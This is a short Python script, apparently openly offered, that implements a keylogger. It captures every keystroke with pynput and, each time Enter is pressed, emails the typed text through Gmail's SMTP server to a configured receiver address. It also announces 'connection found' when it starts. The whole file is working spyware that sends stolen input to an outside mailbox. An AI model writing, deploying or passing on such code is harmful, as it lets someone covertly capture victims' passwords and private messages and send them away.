from pynput import keyboard
import smtplib
from email.mime.text import MIMEText

text = []
Message = ""

User = 'Introduce the sender email account' 
Receptor = 'Introduce the receiver email account'
Password = 'Introduce the sender email account Password'

def typing (key):

    if str(key) == "Key.backspace":
        try:
            text.pop(-1)
        except Exception:
            pass
    
    elif str(key) == "Key.esc":
        text.append("-ESCAPE-")

    elif str(key) == "Key.space":
        text.append(" ")

    elif str(key) == "Key.enter":
        
        if text == ["'c'", "'l'", "'o'", "'s'", "'e'", ' ', "'k'", "'e'", "'y'", "'l'", "'o'", "'g'", "'g'", "'e'", "'r'"]:
            finish()
        else:
            text.append("-INTRO-")
            loop()

    elif str(key) == "Key.alt_l" or str(key) == "Key.alt_r" or str(key) == "Key.ctrl_l" or str(key) == "Key.ctrl_r" or str(key) == "Key.shift_r" or str(key) == "Key.shift":
        pass

    else:
        text.append(str(key))  

def send_email ():

    global Message

    try:
        Message = MIMEText(Message)
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(User, Password)
        server.sendmail(User, Receptor, Message.as_string())
        server.quit()
    
    except Exception:
        send_email()

def loop ():
    
    global Message

    try:
        TextInString = ("".join(text))
        Message = TextInString.replace("'", "")
        del text [:]
        send_email()
        listener.join()
        
    except Exception:
        pass

def finish ():
    global Message
    Message = "Connetion ended"
    send_email()
    exit()

def main ():
    listener.start()
    listener.join()

if __name__ == "__main__":
    Message = "connection found"
    send_email()

    listener = keyboard.Listener(on_release=typing)
    main()
